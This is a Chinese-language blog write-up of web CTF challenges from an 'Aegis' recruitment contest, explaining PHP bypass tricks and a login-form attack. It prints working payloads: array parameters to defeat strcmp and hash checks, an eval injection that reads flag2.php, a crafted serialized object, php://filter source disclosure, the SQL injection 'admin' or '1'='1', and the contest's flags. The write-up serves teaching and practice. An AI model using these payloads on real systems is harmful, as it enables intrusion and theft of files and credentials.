---
title: Aegis招新WriteUp
date: 2019-09-22 21:26:32
update: 2019-09-23 14:10:32
categories:
  - CTF
---

# Adventures in PHP (0)

![](https://images.hujiekang.top/blogimage-8a5d35245fd5010e65bd292454f806fb-b6d7ad6a.jpg)

很明显，flag 就在 `flag1.php` 的 `$flag` 变量中。

观察发现 `$flag` 变量必须存在且非 `NULL`，而且用到了 `strcmp()` 字符串比较函数。而我输入的值显然不可能等于`$flag`的值，故只能想办法绕过 `strcmp()` 函数来达到显示 flag 的目的。

<!-- more -->

查阅 PHP 官方手册中有关 `strcmp()` 函数的说明，发现当字符串和数组或一个对象进行比较时会得到 `NULL` 且返回警告:

![](https://images.hujiekang.top/blogimage-f5960b0fadca8435d7062d4d7a9a3f2e-ca02f219.jpg)

所以最简单的办法，就是使用 `GET` 方法令变量 `$flag` 为一数组 `flag[]=1` 即可绕过 `strcmp()` ，成功得到 flag。

![](https://images.hujiekang.top/blogimage-c10b20645781d4f1d20917eb29377b98-395c2f76.jpg)

---

# Adventures in PHP (1)

![](https://images.hujiekang.top/blogimage-7c9d93b3aaf4c906982fba384a9dee4f-ad94625d.jpg)

同样很容易看出，flag 就在 `flag2.php` 的某个变量中。

观察代码，发现需要以 `GET` 方法读入变量 `$args`，且 `$args` 的值必须和正则表达式`/^\w+$/`匹配，即匹配由数字、26 个英文字母或者下划线组成的字符串，这样才不会进入内层的 `if` 条件导致程序退出。

接下来是 `eval(var_dump($$args););`。 `eval()` 可执行将字符串当成代码来执行，而 `var_dump()` 可以打印出变量的相关信息。又发现 `$$args` 是一个可变变量，即变量名为另一个变量，即 `$args` 。

由于不知道 flag 对应的变量名，所以无法直接传变量名得出 flag，再加上正则表达式的限定，于是联想到了传入超级全局变量数组 `$GLOBALS` ，即可让 `var_dump()` 打印出整个程序中所有变量的信息。

所以用 `GET` 方法传入 `args=GLOBALS` 即可得到对应 flag。

![](https://images.hujiekang.top/blogimage-a294c3701c5bef5b00f89bf0c4d9656a-26139322.jpg)

---

# Is everything injectable?

## 1）

![](https://images.hujiekang.top/blogimage-4b3ca80acc077adccaaf4286b01dac06-f8e1db07.jpg)

解法同上面[第 2 题](#2-Adventures-in-PHP-1)，用 `GET` 方法传入 `args=GLOBALS` 即可得到前半条 flag。

![](https://images.hujiekang.top/blogimage-f6b07a7a6d0dec3d9e527290c2d2de4e-8a43a7d2.jpg)

---

## 2）

![](https://images.hujiekang.top/blogimage-c4c0342844921a8a1c0416539e0864ef-fbfe7ace.jpg)

尝试传入 `hello=GLOBALS` 发现 flag 不在全局变量中：

![](https://images.hujiekang.top/blogimage-4dca690bd4f578b414a43b4103757e7d-012f377c.jpg)

由于题目没有提供更多信息，故想到从被导入的那个 `flag2.php` 入手。借助 `eval()` 函数，
构造字符串 `"1);print_r(file("flag2.php"));//"` ，则该行代码变成如下代码：

```php
eval("var_dump(1);print_r(file("flag2.php"));//);");
```

即打印整数 `1` 的信息，然后打印出 `flag2.php` 的信息。于是得到后半条 flag：

![](https://images.hujiekang.top/blogimage-342d7448488f7dfe22b82e807de8ecb2-e678e00f.jpg)

拼接可得 flag： `aegis{92853051ab8944f7865cf3c2128b34}`。

---

# Adventures in PHP (2)

![](https://images.hujiekang.top/blogimage-44d8f34a3a85e5c887e87e12d6f535c6-8453f2c6.jpg)

读题知：首先需存在一个值为 `begin` 的变量 `mode` ，且读入的变量 `a` 和 `b` 满足 `md5($a)==sha1($b)` 。 查阅资料知，`md5()` 函数和 `sha1()` 函数在对数组进行加密时将返回 `NULL` ，而 `NULL==NULL` 返回 `true` ，即可绕过该条件。故传入`a[]=1&b[]=1` 。

接下来由内部 `if` 条件得出，需要使用 `POST` 方法传入一个关联数组变量 `$token` ，其中应当存在 `"user"=>"user"` ， `"pass"=>"pass"` 两个键。所以构造数组 `array("user"=>"user","pass"=>"pass")` 并序列化得到以下字符串：

```php
a:2:{s:4:"pass";s:4:"pass";s:4:"user";s:4:"user";}
```

序列化函数 `serialize()` 可以将 `PHP` 中的变量转化为一个表示了变量值的字符串，有利于存储或传递 `PHP` 的值，同时不丢失其类型和结构。要将序列化的字符串转为原变量，可使用 `unserialize()` 函数。

最后还有最内层的两个 `if` 条件。很容易看出，此处需要传入一个名为 `$flag` 的 `last_task` 对象，且需要 URL 编码和序列化。条件 `$flag->middle===$flag->left&&$flag->middle===$flag->right` 里的三等号表示不仅等号两端的值要相同，而且类型也要相同。而又不知道变量 `$fl4g` 的值，所以无法令 `$flag->left` 和 `$flag->right` 的值都等于 `$fl4g` 。于是引用变量 `$flag->middle` ，令 `$flag->left=&$flag->middle` ， `$flag->right=&$flag->middle`。构造出 `$flag` 对象：

```php
<?php
class last_task
{
    var $left;
    var $middle;
    var $right;
}

$flag = new last_task();
$flag->left = &$flag->middle;
$flag->right = &$flag->middle;

echo urlencode(serialize($flag));
?>
```

打印出的结果为：

```php
O%3A9%3A%22last_task%22%3A3%3A%7Bs%3A4%3A%22left%22%3BN%3Bs%3A6%3A%22middle%22%3BR%3A2%3Bs%3A5%3A%22right%22%3BR%3A2%3B%7D
```

综上所述，`GET` 方法传入的变量有：`mode=begin&a[]=1&b[]=1`，

`POST` 方法传入的变量有：

`token=a:2:{s:4:"pass";s:4:"pass";s:4:"user";s:4:"user";}&flag=O%3A9%3A%22last_task%22%3A3%3A%7Bs%3A4%3A%22left%22%3BN%3Bs%3A6%3A%22middle%22%3BR%3A2%3Bs%3A5%3A%22right%22%3BR%3A2%3B%7D`

传入变量得到 flag：

![](https://images.hujiekang.top/blogimage-21215905680ea746ff69efc33073ca59-a115352b.jpg)

---

# Adventures in PHP (3)

![](https://images.hujiekang.top/blogimage-4cff8fc414c0770f66d020ad227f7a23-c9ef4be3.jpg)

首先在代码中有一个 `Flag` 对象，里面包含一个 `$file` 变量和一个 `__tostring` 魔术方法。该方法在当对象被看作字符串进行操作时会自动执行。而在后面有一个对 `$password` 变量进行反序列化的操作，故猜想 `$password` 变量是一个序列化后的 `Flag` 对象。

同时，对 `$txt` 变量，有一个 `file_get_contents()` 的函数操作，即以字符串打印出文件的具体内容。而这里显然不可能传入一个文件，故使用 `php://input` 伪协议，此时当传进去的参数作为文件名变量去打开文件时，可以将参数 `php://` 传进，同时以 `POST` 方式传进去的值作为文件内容，供 `PHP` 代码执行时当做文件内容读取。于是此时 `POST` 一个字符串 `welcome to the aegis` 即可。

![](https://images.hujiekang.top/blogimage-0d9b7281b8c05634f4b4cba173c0fc5f-103dd6dc.jpg)

接下来处理变量 `$password` 。观察 `__tostring` 方法，发现会打印出文件名为 `$file` 的文件内容，故尝试令 `$password=>file` 的值为 `flag3.php` ，发现没有成功。查阅资料得知此处可用伪协议 `php://filter`，使用 `php://filter/read=convert.base64-encode/resource=flag3.php` 可以用 `base64` 加密的方式读出文件的内容。故令 `$password->file='php://filter/read=convert.base64-encode/resource=flag3.php'` ，可读出一串字符：

![](https://images.hujiekang.top/blogimage-c6ecebf021e08ef751c4731a3cd13fe6-d7584625.jpg)

用 `base64` 解码得到 `flag3.php` 的文件内容：

```php
<?php
$flag = 'aegis{35d6d33467aae9a2e3dccb4b6b027878}';
?>
```

flag：`aegis{35d6d33467aae9a2e3dccb4b6b027878}`。

---

# EzSqli

![](https://images.hujiekang.top/blogimage-2fa1d6726516bf8bcf28975a0a0b698f-6268554d.jpg)

进行 SQL 注入，猜测后台对数据库的操作大致如下：

```sql
select * from table where username= '用户名' and password = '密码';
```

于是用户名和密码均输入 `admin' or '1'='1` 构造出恒成立语句：

```sql
select * from table where username= ' admin' or '1'='1' and password =' admin' or '1'='1';
```

随后得到 flag：

![](https://images.hujiekang.top/blogimage-e066ca486dfa38c244d19d376fa99494-f6b128b9.jpg)

---
